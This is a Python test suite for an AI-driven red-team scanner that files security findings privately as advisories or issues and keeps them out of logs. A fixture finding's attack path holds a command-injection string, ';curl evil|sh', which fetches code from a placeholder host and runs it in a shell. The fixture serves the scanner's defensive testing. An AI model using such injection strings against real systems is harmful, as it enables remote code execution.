"""Red-team scan: incremental scope, context, private-advisory filing, config, caller and App permission."""
from __future__ import annotations

import base64
import gzip
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, os.path.dirname(__file__))

from test_cli import GIT_ID, CliTestCase, write_config  # noqa: E402

from nightshift import app, prompts, redteam, review_rules, scaffold  # noqa: E402
from nightshift import protocol as ns  # noqa: E402
from nightshift.config import ConfigError  # noqa: E402
from nightshift.doctor import FAIL, rules_checks  # noqa: E402
from nightshift.review_tools import git_in  # noqa: E402

RULES = """version: 1
rules:
  - id: shell-call
    kind: python-call
    pattern: '^(subprocess\\.\\w+|os\\.system)$'
    question: "Is the command a fixed list with no caller-controlled input?"
    security: true
  - id: todo
    kind: regex
    pattern: 'TODO'
    question: "Is the TODO tracked?"
"""

FINDING = {"title": "Command injection in export", "severity": "high", "cwe": "CWE-78",
           "location": "api/export.py:4", "evidence": "os.system('zip ' + name)",
           "attack_path": "POST /export with name=';curl evil|sh' runs a shell", "fix": "use a fixed argv list"}


def sh(root, *args):
    return subprocess.run(["git", *GIT_ID, *args], cwd=root, check=True, capture_output=True, text=True).stdout


class RedteamCase(CliTestCase):
    def setUp(self):
        super().setUp()
        write_config(self.root, redteam={"enabled": True}, bot_login="night-bot")
        Path(self.root, ".night-shift/review-rules.yml").write_text(RULES, encoding="utf-8")
        Path(self.root, "api").mkdir()
        Path(self.root, "api/app.py").write_text("def hello():\n    return 'hi'\n", encoding="utf-8")
        sh(self.root, "init", "-q")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-qm", "base")
        self.first = sh(self.root, "rev-parse", "HEAD").strip()
        self.fake.add_issue(number=1, title="Night-shift log", labels=["night-log"])

    def commit(self, path, text, msg="change"):
        Path(self.root, path).parent.mkdir(parents=True, exist_ok=True)
        Path(self.root, path).write_text(text, encoding="utf-8")
        sh(self.root, "add", "-A")
        sh(self.root, "commit", "-qm", msg)
        return sh(self.root, "rev-parse", "HEAD").strip()

    def scanned(self, sha, user=None):
        self.fake.add_comment(1, ns.marker("redteam", sha=sha, base=""), user=user)

    def context(self, *extra):
        out_dir = os.path.join(self.root, "ctx")
        gh_out = os.path.join(self.root, "gh_output")
        if os.path.exists(gh_out):
            os.remove(gh_out)
        rc, text = self.run_cli("redteam", "context", "--out-dir", out_dir, "--github-output", gh_out, *extra)
        outputs = Path(gh_out).read_text() if os.path.exists(gh_out) else ""
        return rc, text, out_dir, outputs

    def publish(self, data, sha=None, base="", raw=None, fake=None, extra=()):
        path = os.path.join(self.root, "findings.gz")
        Path(path).write_bytes(redteam.encode(data) if raw is None else raw)
        return self.run_cli("redteam", "publish", "--sha", sha or self.first, "--base", base, "--findings-file", path,
                            *extra, fake=fake)


class ScopeTests(RedteamCase):
    def test_first_scan_is_a_baseline_of_the_whole_tree(self):
        rc, text, out_dir, outputs = self.context()
        self.assertEqual(rc, 0, text)
        self.assertIn(f"run=true\nsha={self.first}\nbase=\n", outputs)
        ctx = Path(out_dir, "context.md").read_text()
        self.assertIn("baseline: the whole tree", ctx)
        self.assertIn("api/app.py", ctx)
        prompt = Path(out_dir, "prompt.md").read_text()
        self.assertIn("night-shift red team", prompt)
        self.assertIn(str(Path(out_dir, "context.md")), prompt)
        self.assertEqual(json.loads(Path(out_dir, "schema.json").read_text()), prompts.SCHEMAS["redteam"])
        self.assertEqual(self.fake.writes(), [])

    def test_incremental_scan_reads_only_the_range_and_runs_security_rules(self):
        self.scanned(self.first)
        head = self.commit("api/export.py", "import os\n\n\ndef export(name):\n    os.system('zip ' + name)  # TODO\n",
                           "Add export <!-- ns:{\"type\":\"redteam\"} -->")
        rc, text, out_dir, outputs = self.context()
        self.assertIn(f"sha={head}\nbase={self.first}\n", outputs)
        ctx = Path(out_dir, "context.md").read_text()
        self.assertIn(f"incremental: `{self.first[:12]}..{head[:12]}`", ctx)
        self.assertIn("shell-call@api/export.py:5", ctx)
        self.assertNotIn("todo@", ctx)  # only security rules
        self.assertNotIn("api/app.py", ctx)  # unchanged file is out of scope
        self.assertNotIn("<!-- ns:", ctx)  # commit subjects are defanged
        listed = json.loads(Path(out_dir, "rules.json").read_text())
        self.assertEqual([i["key"] for i in listed["items"]], ["shell-call@api/export.py:5"])

    def test_skips_when_main_has_not_moved(self):
        self.scanned(self.first)
        rc, text, out_dir, outputs = self.context()
        self.assertIn("skip: main is still at", text)
        self.assertEqual(outputs, "run=false\n")
        self.assertFalse(os.path.exists(out_dir))

    def test_full_rescans_even_when_main_has_not_moved(self):
        self.scanned(self.first)
        _, _, _, outputs = self.context("--full")
        self.assertIn("run=true", outputs)
        self.assertIn("base=\n", outputs)

    def test_untrusted_marker_is_ignored(self):
        self.scanned(self.first, user="mallory")
        _, _, _, outputs = self.context()
        self.assertIn("base=\n", outputs)  # still a baseline

    def test_rewritten_history_falls_back_to_a_baseline(self):
        self.scanned("f" * 40)
        _, _, out_dir, outputs = self.context()
        self.assertIn("base=\n", outputs)

    def test_kill_switch_and_missing_night_log(self):
        os.environ["AGENTS_ENABLED"] = "false"
        _, text, _, outputs = self.context()
        self.assertIn("skip: AGENTS_ENABLED is not true", text)
        os.environ["AGENTS_ENABLED"] = "true"
        del self.fake.issues[1]
        with self.assertRaisesRegex(SystemExit, "night-log"):
            self.context()

    def test_scope_helper_skips_a_range_with_no_file_change(self):
        sh(self.root, "commit", "-q", "--allow-empty", "-m", "empty")
        sc = redteam.scope(git_in(self.root), Path(self.root), self.first)
        self.assertIn("no file changed", sc.skip)

    def test_invalid_rules_file_scans_without_rules(self):
        self.commit(".night-shift/review-rules.yml", "rules: [1]\n")
        rc, text, _, outputs = self.context()
        self.assertEqual(rc, 0)
        self.assertIn("scanning without it", text)
        self.assertIn("run=true", outputs)


class PublishTests(RedteamCase):
    def setUp(self):
        super().setUp()
        self.fake.repo_settings["private"] = False

    def test_files_new_findings_as_draft_advisories_and_records_the_commit(self):
        low = {**FINDING, "title": "Verbose error", "severity": "low", "location": "api/app.py:2"}
        rc, text = self.publish({"findings": [FINDING, low]})
        self.assertEqual(rc, 0, text)
        self.assertEqual(len(self.fake.advisories), 1)
        adv = self.fake.advisories[0]
        self.assertEqual(adv["summary"], "Command injection in export")
        self.assertEqual(adv["severity"], "high")
        self.assertEqual(adv["vulnerabilities"], [{"package": {"ecosystem": "other", "name": "o/r"}}])
        self.assertIn("os.system('zip ' + name)", adv["description"])
        self.assertIn('"type":"redteam-finding"', adv["description"].replace(" ", ""))
        log = self.fake.comments[1][-1]["body"]
        marks = ns.trusted([{"id": 1, **self.fake.comments[1][-1]}], "night-bot", "redteam")
        self.assertEqual(marks[0].data["sha"], self.first)
        self.assertIn("red-team scan** done", log)
        for secret in ("zip", "curl", "Command injection", "Verbose", "high", "1 ", "GHSA"):  # not even a count
            self.assertNotIn(secret, log)
        self.assertNotIn("zip", text)
        self.assertNotIn("Command injection", text)

    def test_private_repo_files_security_issues_and_reports_counts(self):
        self.fake.repo_settings["private"] = True
        low = {**FINDING, "title": "Verbose error", "severity": "low", "location": "api/app.py:2"}
        rc, _ = self.publish({"findings": [FINDING, low]})
        self.assertEqual(rc, 0)
        self.assertEqual(self.fake.advisories, [])
        made = [i for n, i in self.fake.issues.items() if n != 1]
        self.assertEqual(len(made), 1)
        self.assertEqual(self.fake.label_names(made[0]["number"]), {"security", "human"})
        self.assertEqual(made[0]["title"], "[high] Command injection in export")
        log = self.fake.comments[1][-1]["body"]
        self.assertIn("1 new `security` issue(s) at high or above", log)
        self.assertIn("1 below high", log)
        rc, _ = self.publish({"findings": [FINDING]})  # filed once
        self.assertEqual(len([n for n in self.fake.issues if n != 1]), 1)

    def test_same_finding_is_filed_once_even_when_its_line_moves(self):
        self.publish({"findings": [FINDING]})
        moved = {**FINDING, "location": "api/export.py:40", "title": "command  injection in export!"}
        rc, text = self.publish({"findings": [moved]})
        self.assertEqual(rc, 0)
        self.assertEqual(len(self.fake.advisories), 1)
        self.assertEqual(len(ns.trusted([{"id": 1, **c} for c in self.fake.comments[1]], "night-bot", "redteam")), 2)

    def test_reworded_title_with_the_same_cwe_and_file_is_a_duplicate(self):
        self.publish({"findings": [FINDING]})
        # Seen live: the second scan reworded the title and raised the severity.
        reworded = {**FINDING, "title": "OS command injection and path traversal in export()", "severity": "critical",
                    "cwe": "CWE 78", "location": "API/export.py:8"}
        self.publish({"findings": [reworded]})
        self.assertEqual(len(self.fake.advisories), 1)
        other = {**FINDING, "title": "Path traversal in export", "cwe": "CWE-22"}
        no_cwe = {**FINDING, "title": "Unbounded archive size", "cwe": ""}
        self.publish({"findings": [other, no_cwe]})
        self.assertEqual(len(self.fake.advisories), 3)

    def test_untrusted_advisory_does_not_suppress_a_finding(self):
        fp = redteam.fingerprint(redteam.findings_of({"findings": [FINDING]})[0])
        self.fake.advisories.append({"author": {"login": "mallory"}, "description": ns.marker("redteam-finding", fp=fp)})
        self.publish({"findings": [FINDING]})
        self.assertEqual(len(self.fake.advisories), 2)

    def test_failure_records_no_progress(self):
        self.fake.forbidden.add(r"security-advisories")
        rc, text = self.publish({"findings": [FINDING]})
        self.assertEqual(rc, 1)
        self.assertIn("Repository security advisories", text)
        self.assertEqual(ns.trusted([{"id": 1, **c} for c in self.fake.comments[1]], "night-bot", "redteam"), [])
        log = self.fake.comments[1][-1]["body"]
        self.assertIn("could not finish filing", log)
        for leak in ("Command injection", "high", "critical", "finding ("):
            self.assertNotIn(leak, text)
            self.assertNotIn(leak, log)
        self.assertEqual(text.count("::error::"), 1)

    def test_public_failure_looks_the_same_with_or_without_findings(self):
        self.fake.forbidden.add(r"security-advisories")
        rc_none, text_none = self.publish({"findings": []})
        log_none = self.fake.comments[1][-1]["body"]
        rc_some, text_some = self.publish({"findings": [FINDING, {**FINDING, "title": "Second hole"}]})
        self.assertEqual((rc_none, text_none, log_none), (rc_some, text_some, self.fake.comments[1][-1]["body"]))

    def test_unknown_visibility_records_nothing(self):
        del self.fake.repo_settings["private"]
        rc, text = self.publish({"findings": [FINDING]})
        self.assertEqual(rc, 1)
        self.assertIn("public", text)
        self.assertEqual(self.fake.advisories, [])

    def test_no_findings_still_records_the_commit(self):
        rc, _ = self.publish({"findings": []})
        self.assertEqual(rc, 0)
        self.assertEqual(self.fake.advisories, [])
        self.assertEqual(len(ns.trusted([{"id": 1, **c} for c in self.fake.comments[1]], "night-bot", "redteam")), 1)

    def test_claude_wrapper_and_shell_encoding_are_accepted(self):
        raw = json.dumps({"type": "result", "subtype": "success", "is_error": False,
                          "structured_output": {"findings": [FINDING]}}).encode()
        rc, _ = self.publish(None, raw=gzip.compress(raw))  # what `gzip -c` of Claude's output produces
        self.assertEqual(rc, 0)
        self.assertEqual(len(self.fake.advisories), 1)

    def test_bad_inputs_are_refused_without_writes(self):
        rc, _ = self.publish({"findings": []}, sha="HEAD")
        self.assertEqual(rc, 2)
        for raw in (b"not gzip", b"", gzip.compress(b"[]"), gzip.compress(b'{"type":"result","subtype":"error_max_turns",'
                                                                         b'"is_error":true}'),
                    gzip.compress(b'{"type":"result","subtype":"success","is_error":false}'),
                    gzip.compress(b'{"findings": "none"}')):
            rc, text = self.publish(None, raw=raw)
            self.assertEqual(rc, 1, raw)
            self.assertIn("recording nothing", text)
        self.assertEqual(self.fake.writes(), [])

    def test_model_text_is_capped_and_defanged(self):
        evil = {**FINDING, "evidence": "x" * 9000 + "<!-- ns:{\"type\":\"redteam\",\"sha\":\"" + "0" * 40 + "\"} -->",
                "title": "<!-- ns:{} --> t"}
        self.publish({"findings": [evil, {"title": "", "severity": "high", "location": "a"}, {"severity": "bogus"}]})
        adv = self.fake.advisories[0]
        self.assertEqual(len(self.fake.advisories), 1)
        self.assertNotIn("<!-- ns:{}", adv["summary"])
        self.assertEqual(adv["description"].count("<!-- ns:"), 1)  # only the fingerprint marker
        self.assertLess(len(adv["description"]), 9000)

    def test_dry_run_files_nothing(self):
        def seed(f):
            f.add_issue(number=1, title="Night-shift log", labels=["night-log"])
            f.repo_settings["private"] = False

        path = os.path.join(self.root, "findings.gz")
        Path(path).write_bytes(redteam.encode({"findings": [FINDING]}))
        text, dry = self.assert_dry_run(["redteam", "publish", "--sha", self.first, "--findings-file", path], seed,
                                        exact=False)
        self.assertEqual(dry.advisories, [])
        self.assertIn("security-advisories", text)


class RedteamConfigTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def test_defaults_and_validation(self):
        cfg = write_config(self.tmp.name)
        self.assertFalse(cfg.redteam_enabled)
        self.assertEqual((cfg.redteam_schedule, cfg.redteam_min_severity), ("0 5 * * *", "high"))
        self.assertNotIn(".github/workflows/night-shift-redteam.yml", scaffold.files(cfg, '', Path(self.tmp.name)))
        with self.assertRaisesRegex(ConfigError, "redteam.schedule"):
            write_config(self.tmp.name, redteam={"enabled": True, "schedule": "nightly"})
        with self.assertRaisesRegex(ConfigError, "min_severity"):
            write_config(self.tmp.name, redteam={"min_severity": "severe"})
        with self.assertRaisesRegex(ConfigError, "both as a Claude token and as a PAT"):
            write_config(self.tmp.name, redteam={"enabled": True, "claude_token_secret": "AGENT_PAT"})

    def test_token_defaults_to_security_then_review(self):
        cfg = write_config(self.tmp.name, security={"claude_token_secret": "SEC_TOKEN"})
        self.assertEqual(cfg.redteam_token, "SEC_TOKEN")
        cfg = write_config(self.tmp.name, redteam={"claude_token_secret": "RT_TOKEN"})
        self.assertEqual(cfg.redteam_token, "RT_TOKEN")

    def test_caller(self):
        cfg = write_config(self.tmp.name, redteam={"enabled": True, "schedule": "15 4 * * *", "model": "sonnet"})
        text = scaffold.files(cfg, '', Path(self.tmp.name))[".github/workflows/night-shift-redteam.yml"]
        self.assertIn('- cron: "15 4 * * *"', text)
        self.assertIn("redteam.yml@", text)
        self.assertIn("model: sonnet", text)
        self.assertIn("claude_token: ${{ secrets.CLAUDE_TOKEN_REVIEW }}", text)  # review token default
        self.assertIn("agent_pat: ${{ secrets.AGENT_PAT }}", text)
        self.assertNotIn("secrets[", text)
        self.assertNotIn("inherit", text)

    def test_doctor_flags_a_missing_caller_and_the_permission(self):
        cfg = write_config(self.tmp.name, redteam={"enabled": True})
        checks = rules_checks(Path(self.tmp.name), cfg)
        self.assertTrue(any(c.level == FAIL and "night-shift-redteam.yml" in c.what for c in checks))
        self.assertTrue(any("Repository security advisories" in c.what for c in checks))


class AppAdvisoriesTests(unittest.TestCase):
    def mint(self, granted, advisories):
        asked = {}

        def request(method, path, token, body=None):
            if path == "/app":
                return {"slug": "ns"}
            if path.endswith("/installation"):
                return {"id": 7}
            asked.update(body["permissions"])
            return {"token": "t", "permissions": granted}

        result = app.mint("o/r", "1", "KEY", request=request, sign=lambda m, k: b"sig", advisories=advisories)
        return result, asked

    def test_only_the_filing_job_asks_for_advisories(self):
        _, asked = self.mint(dict(app.PERMISSIONS), advisories=False)
        self.assertNotIn("repository_advisories", asked)
        _, asked = self.mint({**app.PERMISSIONS, "repository_advisories": "write"}, advisories=True)
        self.assertEqual(asked["repository_advisories"], "write")
        self.assertIn("repository_advisories", app.manifest()["default_permissions"])

    def test_an_unrequested_advisories_grant_is_refused(self):
        with self.assertRaisesRegex(app.AppError, "repository_advisories"):
            self.mint({**app.PERMISSIONS, "repository_advisories": "write"}, advisories=False)


class SchemaTests(unittest.TestCase):
    def test_prompt_and_schema_registered(self):
        self.assertIn("redteam", prompts.PROMPTS)
        self.assertEqual(prompts.SCHEMAS["redteam"], redteam.REDTEAM_SCHEMA)
        self.assertIn("__CONTEXT_FILE__", prompts.template("redteam"))

    def test_reusable_workflow_keeps_findings_out_of_logs_and_artifacts(self):
        text = (Path(__file__).parent.parent / ".github/workflows/redteam.yml").read_text()
        scan = text.split("\n  scan:")[1].split("\n  file:")[0]
        self.assertIn("2> /dev/null", scan)
        self.assertNotIn("upload-artifact", scan)
        self.assertNotIn("cat \"$P/findings.json\"", scan)
        self.assertNotIn("agent_pat", scan)
        self.assertNotIn("app_private_key", scan)
        self.assertIn("app-token --advisories", text.split("\n  file:")[1])

    def test_rules_scan_helper_used_by_context(self):
        rules = review_rules.parse({"version": 1, "rules": [{"id": "x", "kind": "regex", "pattern": "a",
                                                              "question": "q?", "security": True}]})
        self.assertTrue(rules[0].security)


if __name__ == "__main__":
    unittest.main()


class AppInstallationsTests(unittest.TestCase):
    def fake(self, perms=None):
        calls = []

        def request(method, path, token, body=None):
            calls.append((method, path, token, body))
            if path == "/app":
                return {"slug": "ns"}
            if path.startswith("/app/installations?"):
                return [{"id": 1, "account": {"login": "arbiterlabs", "type": "Organization"},
                         "repository_selection": "selected", "created_at": "2026-11-09T00:00:00Z"},
                        {"id": 2, "account": {"login": "someone", "type": "User"}, "repository_selection": "all",
                         "created_at": "2026-11-10T00:00:00Z", "suspended_at": "2026-11-11T00:00:00Z"}]
            if path.endswith("/access_tokens"):
                return {"token": "itok", "permissions": perms or {"metadata": "read", "issues": "read"}}
            if path.startswith("/installation/repositories"):
                return {"repositories": [{"full_name": "arbiterlabs/arbiter", "private": True}]}
            if "/issues/comments" in path:
                return [{"user": {"login": "ns[bot]"}, "created_at": "2026-11-11T09:00:00Z"},
                        {"user": {"login": "ns[bot]"}, "created_at": "2026-11-10T09:00:00Z"},
                        {"user": {"login": "alice"}, "created_at": "2026-11-11T10:00:00Z"}]
            raise AssertionError(path)
        return request, calls

    def test_lists_installations_with_read_only_tokens(self):
        request, calls = self.fake()
        data = app.installations("1", "KEY", request=request, sign=lambda m, k: b"s")
        first, second = data["installations"]
        self.assertEqual(first["repos"], [{"name": "arbiterlabs/arbiter", "private": True,
                                           "last_comment": "2026-11-11T09:00:00Z"}])
        self.assertEqual(second["repos"], [])  # suspended: no token minted
        minted = [b for m, p, t, b in calls if p.endswith("/access_tokens")]
        self.assertEqual(minted, [{"permissions": {"metadata": "read", "issues": "read"}}])

    def test_refuses_a_listing_token_with_write(self):
        request, _ = self.fake(perms={"metadata": "read", "contents": "write"})
        with self.assertRaisesRegex(app.AppError, "write"):
            app.installations("1", "KEY", request=request, sign=lambda m, k: b"s")


class SealTests(unittest.TestCase):
    def test_workflow_never_passes_plaintext_between_jobs(self):
        text = (Path(__file__).parent.parent / ".github/workflows/redteam.yml").read_text()
        scan, file_job = text.split("\n  scan:")[1].split("\n  file:")
        scan = scan.split("\n  validate:")[0]   # the validate job has its own tests (test_validate.py)
        self.assertIn("openssl enc -aes-256-cbc", scan)
        self.assertIn("trap 'rm -f", scan)
        self.assertIn("truncate -s 65536", scan)
        self.assertNotIn("wc -c < \"$P/findings.json\"", scan)
        # The scan job hands over exactly one output, and the only echo into it is the ciphertext.
        outputs = scan.split("outputs:")[1].split("steps:")[0].strip().splitlines()
        self.assertEqual(outputs, ["findings: ${{ steps.scan.outputs.findings }}"])
        self.assertEqual([ln.strip() for ln in scan.splitlines() if "GITHUB_OUTPUT" in ln],
                         ['echo "findings=$sealed" >> "$GITHUB_OUTPUT"'])
        run = file_job.split("- name: File findings privately")[1].split("run: |")[1].strip().splitlines()
        self.assertEqual([ln.strip() for ln in run], [
            "set -euo pipefail",
            "printf '%s' \"$SEALED\" | base64 -d | openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -pass env:SEAL_KEY \\",
            '| python3 -m nightshift redteam publish --sha "$SHA" --base "$BASE" --findings-file - '
            '--validation "$VALIDATION"'])

    @unittest.skipUnless(all(shutil.which(t) for t in ("openssl", "jq", "truncate")), "no openssl, jq or truncate")
    def test_seal_round_trip_matches_the_workflow(self):
        doc = json.dumps({"type": "result", "subtype": "success", "is_error": False,
                          "structured_output": {"findings": [FINDING]}})
        env = {**os.environ, "K": "sk-test-token"}
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp)
        (tmp / "f.json").write_text(doc)
        sealed = subprocess.run(
            "jq -c '{type, subtype, is_error, structured_output}' f.json | gzip -9 -c > slim.gz && truncate -s 65536 slim.gz"
            " && openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass env:K < slim.gz | base64 | tr -d '\\n'",
            shell=True, cwd=tmp, env=env, capture_output=True, check=True).stdout
        self.assertTrue(80000 < len(sealed) < 120000)  # fixed size, under the env-var limit
        self.assertNotIn(b"Command", base64.b64decode(sealed))
        raw = subprocess.run("base64 -d | openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -pass env:K",
                             shell=True, input=sealed, env=env, capture_output=True, check=True).stdout
        self.assertEqual(redteam.decode(raw)["findings"][0]["title"], FINDING["title"])
        wrong = subprocess.run("base64 -d | openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -pass env:K",
                               shell=True, input=sealed, env={**env, "K": "other"}, capture_output=True)
        self.assertTrue(wrong.returncode != 0 or not wrong.stdout.startswith(b"\x1f\x8b"))


class GuardTests(RedteamCase):
    def test_dispatch_from_another_branch_is_skipped(self):
        os.environ["REF_NAME"] = "feature"
        _, text, _, outputs = self.context()
        self.assertIn("runs on main only", text)
        self.assertEqual(outputs, "run=false\n")

    def test_doctor_needs_bot_login_and_model_is_validated(self):
        cfg = write_config(self.tempdir(), redteam={"enabled": True})
        root = Path(self.tempdir())
        self.assertTrue(any(c.level == FAIL and "bot_login" in c.what for c in rules_checks(root, cfg)))
        with self.assertRaisesRegex(ConfigError, "redteam.model"):
            write_config(self.tempdir(), redteam={"model": "opus # x"})

    def test_check_pat_probes_advisories_and_admin_on_public_repos_only(self):
        from nightshift.doctor import WARN, access_checks

        self.fake.repo_settings.update({"private": False, "permissions": {"admin": False}})
        checks = access_checks(self.fake.gh(), advisories=True)
        self.assertTrue(any(c.level == WARN and "security manager" in c.what for c in checks))
        self.assertTrue(any("security-advisories" in p for m, p, b in self.fake.calls))
        self.fake.calls.clear()
        self.fake.repo_settings["private"] = True
        access_checks(self.fake.gh(), advisories=True)
        self.assertFalse(any("security-advisories" in p for m, p, b in self.fake.calls))
